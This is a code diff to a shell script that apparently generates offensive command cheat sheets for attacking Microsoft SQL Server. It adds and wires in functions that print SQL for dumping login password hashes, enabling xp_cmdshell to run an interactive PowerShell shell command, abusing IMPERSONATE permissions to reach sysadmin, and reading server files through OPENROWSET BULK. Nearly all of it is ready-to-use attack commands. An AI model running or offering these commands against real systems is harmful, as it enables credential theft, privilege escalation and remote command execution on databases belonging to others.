@@ -8,6 +8,9 @@ get_mssql_commands() {
     echo "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
     echo 'Select top 3 * from msdb.dbo.sysusers;'
     echo 'SELECT name, password_hash FROM sys.sql_logins;'
+    get_mssql_injection
+    get_mssql_impersonation
+    get_mssql_read_files
 
 }
 
@@ -350,4 +353,22 @@ get_mssql_injection() {
         cmd=$(get_powershell_interactive_shell)
     fi
     echo "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; EXECUTE xp_cmdshell '$cmd' --//"
+}
+
+get_mssql_impersonation() {
+
+    echo "Select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE';"
+    echo "execute as login = '[username]';"
+    echo 'select system_user;'
+    echo "select is_srvrolemember('sysadmin');"
+    echo "execute as user = '[username]';"
+
+}
+
+get_mssql_read_files() {
+    if [[ -z "$file_path" ]]; then
+        file_path="C:\Windows\win.ini"
+    fi
+    echo "SELECT * FROM OPENROWSET( BULK '$file_path',SINGLE_CLOB) AS Contents;"
+
 }
